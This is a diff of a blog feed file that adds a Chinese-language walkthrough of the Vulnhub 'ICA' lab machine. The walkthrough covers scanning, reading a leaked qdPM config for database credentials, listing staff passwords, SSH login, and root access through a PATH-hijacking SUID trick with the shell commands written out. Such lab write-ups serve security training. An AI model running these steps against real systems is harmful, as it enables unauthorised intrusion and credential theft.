@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>Vulnhub打靶-ICA</title>
+      <link href="/post/2f01fd02.html"/>
+      <url>/post/2f01fd02.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://download.vulnhub.com/ica/ica1.zip</code></p><p>攻击机器：192.168.20.128（Windows操作系统）&amp; 192.168.20.138（kali）</p><p>提示信息：根据我们的情报网络提供的信息，ICA 正在进行一个秘密项目。我们需要找出这个项目是什么。获得访问信息后，请将其发送给我们。我们将设置一个后门程序，以便稍后访问系统。你只关注项目是什么。您可能需要经过多层安全保护。中情局完全有信心您能成功完成这项任务。祝你好运，特工！</p><p>靶机：192.168.20.0/24</p><p>目标：获取2个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老样子首先使用<code>arp-scan -l</code>对主机进行探活，发现主机IP为<code>192.168.20.148</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023111302117.png" alt="image-20241023111302117"></p><p>之后对开放的端口进行扫描，执行<code>nmap -O -sV -p- -A 192.168.20.148</code>，结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023111445956.png" alt="image-20241023111445956"></p><p>靶机开放了<code>22</code>、<code>80</code>、<code>3306</code>、<code>33060</code>端口，其中<code>80</code>和<code>3306</code>端口是我们需要特别关注的两个端口，我们首先去看看<code>80</code>端口，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023112611689.png" alt="image-20241023112611689"></p><p>我们发现是qdpm 9.2版本，我们去浏览器搜索一下这个版本的框架是否存在历史漏洞</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/8aeafac12b53e09aa0ced368a0c823b1.png" alt="8aeafac12b53e09aa0ced368a0c823b1"></p><p>我们发现存在密码泄露的漏洞，我们访问<code>http://192.168.20.148/core/config/databases.yml</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023113048137.png" alt="image-20241023113048137"></p><p>成功找到mysql的账号密码，我们远程连接mysql数据库即可</p><h2 id="漏洞初探"><a href="#漏洞初探" class="headerlink" title="漏洞初探"></a>漏洞初探</h2><p>我们使用<code>mysql -u qdpmadmin -h 192.168.20.148 -p</code>登录mysql服务器</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023134020409.png" alt="image-20241023134020409"></p><p>我们去qdpm数据库里面看看有没有什么信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023134635991.png" alt="image-20241023134635991"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023134923320.png" alt="image-20241023134923320"></p><p>我们在<code>staff</code>数据库中找到了一串账户和密码，我们拿去解密，并保存在txt文件中，如下所示</p><div class="table-container"><table><thead><tr><th style="text-align:center">user</th><th style="text-align:center">passwd</th></tr></thead><tbody><tr><td style="text-align:center">Smith</td><td style="text-align:center">X7MQkP3W29fewHdC</td></tr><tr><td style="text-align:center">Lucas</td><td style="text-align:center">suRJAdGwLp8dy3rF</td></tr><tr><td style="text-align:center">Travis</td><td style="text-align:center">DJceVy98W28Y7wLg</td></tr><tr><td style="text-align:center">Dexter</td><td style="text-align:center">7ZwV4qtg42cmUXGX</td></tr><tr><td style="text-align:center">Meyer</td><td style="text-align:center">cqNnBWCByS2DuJSy</td></tr></tbody></table></div><p>我么将这5个用户一个个去尝试登录ssh，我们成功登录两个ssh服务，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023140802495.png" alt="image-20241023140802495"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023140814313.png" alt="image-20241023140814313"></p><p>并且我们发现了第一个flag，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023140902954.png" alt="image-20241023140902954"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ICA&#123;Secret_Project&#125;</span><br></pre></td></tr></table></figure><p>同时发现了一个提示，note.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It seems to me that there is a weakness while accessing the system.</span><br><span class="line">As far as I know, the contents of executable files are partially viewable.</span><br><span class="line">I need to find out if there is a vulnerability or not.</span><br></pre></td></tr></table></figure><p>提示了我们要去找可执行文件，可执行文件上存在漏洞</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>我们尝试进行suid提权，执行<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，执行结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023142145279.png" alt="image-20241023142145279"></p><p>其中<code>get_access</code>文件十分的可疑，我们试着运行该文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023142740680.png" alt="image-20241023142740680"></p><p>我们使用strings命令查看该文件的函数，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/e196196ad64c6d58f040fd16f26e87df.png" alt="e196196ad64c6d58f040fd16f26e87df"></p><p>这里的cat我们可以使用环境变量进行提权，具体操作如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; cat</span><br><span class="line">chmod +x cat </span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /opt</span><br><span class="line">./get_access</span><br></pre></td></tr></table></figure><p>执行之后可以发现成功提权</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023144725515.png" alt="image-20241023144725515"></p><p>具体原理就是我们将<code>&quot;/bin/bash&quot;</code>这个命令伪装成<code>cat</code>，而系统在调用<code>cat</code>命令的时候会从左往右调用环境变量，而我们的<code>/tmp</code>环境变量在写入时处于最左端，所以里面的<code>cat</code>会被优先调用，进而直接执行<code>/bin/bash</code>命令，进而拿到root权限</p><p>成功拿到root.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ICA&#123;Next_Generation_Self_Renewable_Genetics&#125;</span><br></pre></td></tr></table></figure><p>本题到此结束</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>浏览器进行信息收集，寻找泄露信息</li><li>mysql收集系统信息</li><li>利用环境变量提权</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络攻防 </category>
+          
+          <category> 红蓝对抗 </category>
+          
+          <category> 红队入侵 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 实战打靶 </tag>
+            
+            <tag> 红队技战法 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Vulnhub打靶-Thales</title>
       <link href="/post/13f08f7b.html"/>
       <url>/post/13f08f7b.html</url>
@@ -1012,9 +1043,9 @@
       
         <tags>
             
-            <tag> sqlmap </tag>
-            
             <tag> 编码注入 </tag>
+            
+            <tag> sqlmap </tag>
             
         </tags>
       
@@ -1045,11 +1076,11 @@
       
         <tags>
             
+            <tag> sqlmap </tag>
+            
             <tag> Oracle </tag>
             
             <tag> Mongodb </tag>
-            
-            <tag> sqlmap </tag>
             
         </tags>
       
